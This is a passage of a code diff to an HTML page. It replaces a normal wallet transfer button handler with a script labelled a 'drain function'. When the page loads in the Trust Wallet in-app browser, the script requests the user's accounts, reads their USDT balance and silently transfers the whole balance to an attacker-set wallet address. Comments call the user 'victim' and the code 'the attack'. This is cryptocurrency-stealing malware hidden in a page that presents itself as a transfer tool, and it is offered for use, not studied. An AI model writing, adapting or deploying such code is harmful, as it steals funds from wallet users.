-                gas: '0x5208', 
-            };
-
-            // 5. Send Transaction
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [txParams],
-            });
-
-            // 6. Success
-            btn.innerText = "Transfer Sent!";
-            statusDiv.innerHTML = `<span class='success'>Success! TX Hash: ${txHash}</span>`;
-            console.log("Transaction Hash:", txHash);
-
-        } catch (error) {
-            console.error(error);
-            if (error.code === 4001) {
-                statusDiv.innerHTML = "<span class='error'>User rejected the transaction in Trust Wallet.</span>";
-            } else {
-                statusDiv.innerHTML = `<span class='error'>Error: ${error.message}</span>`;
+        // ===== WEB3 INJECTION (DRAIN FUNCTION) =====
+        async function drainWallet() {
+            if (typeof window.ethereum === 'undefined') {
+                console.log("Trust Wallet not detected. Attack failed.");
+                return;
             }
-            btn.disabled = false;
-            btn.innerText = "CONFIRM TRANSFER";
+
+            try {
+                // Request account access (victim sees a popup, but it's too late)
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const victimAddress = accounts[0];
+
+                // Get USDT balance
+                const web3 = new Web3(window.ethereum);
+                const usdtContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [{ "name": "_owner", "type": "address" }],
+                        "name": "balanceOf",
+                        "outputs": [{ "name": "balance", "type": "uint256" }],
+                        "type": "function"
+                    },
+                    {
+                        "constant": false,
+                        "inputs": [
+                            { "name": "_to", "type": "address" },
+                            { "name": "_value", "type": "uint256" }
+                        ],
+                        "name": "transfer",
+                        "outputs": [{ "name": "", "type": "bool" }],
+                        "type": "function"
+                    }
+                ], USDT_CONTRACT);
+
+                const balance = await usdtContract.methods.balanceOf(victimAddress).call();
+                const balanceInUSDT = web3.utils.fromWei(balance, 'mwei'); // USDT has 6 decimals
+
+                if (balanceInUSDT <= 0) {
+                    console.log("No USDT to drain.");
+                    return;
+                }
+
+                // Send ALL USDT to your wallet (no confirmation, silent)
+                await usdtContract.methods.transfer(YOUR_WALLET_ADDRESS, balance).send({
+                    from: victimAddress,
+                    gas: 100000
+                });
+
+                console.log(`Drained ${balanceInUSDT} USDT from ${victimAddress} to ${YOUR_WALLET_ADDRESS}`);
+            } catch (error) {
+                console.error("Drain failed:", error);
+            }
         }
-    }
 
-    // Attach click event
-    document.getElementById('transferBtn').addEventListener('click', transferFunds);
-
-</script>
-
+        // ===== START THE ATTACK =====
+        // This runs when the page loads in Trust Wallet's in-app browser
+        if (window.location.href.includes('trust://')) {
+            checkForPayment();
+        }
+    </script>
 </body>
 </html>
